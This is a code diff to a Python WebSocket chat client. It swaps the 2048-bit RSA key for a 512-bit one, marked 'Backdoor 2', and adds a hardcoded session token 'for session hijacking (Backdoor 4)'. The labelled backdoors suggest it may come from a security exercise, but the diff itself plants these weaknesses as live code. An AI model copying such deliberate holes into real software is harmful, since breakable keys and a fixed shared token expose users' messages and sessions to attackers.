@@ -8,11 +8,14 @@ from cryptography.hazmat.backends import default_backend
 import base64
 import os
 
-# Generate RSA key pair for the client
-def generate_rsa_key_pair():
+# Hardcoded session token for session hijacking (Backdoor 4)
+HARDCODED_SESSION_TOKEN = "mySecretToken"
+
+# Generate a weak RSA key pair (Backdoor 2)
+def generate_weak_rsa_key_pair():
     private_key = rsa.generate_private_key(
         public_exponent=65537,
-        key_size=2048,
+        key_size=512,  # Weak key length (backdoor)
         backend=default_backend()
     )
     public_key = private_key.public_key()
@@ -103,7 +106,9 @@ async def send_private_message(websocket, aes_key, iv, public_keys, message, des
 # Main function
 async def main():
     uri = "ws://localhost:12345"
-    private_key, public_key = generate_rsa_key_pair()
+    
+    # Use a weak RSA key pair for encryption (Backdoor 2)
+    private_key, public_key = generate_weak_rsa_key_pair()
     public_key_pem = export_public_key(public_key)
     
     # Connect to WebSocket server
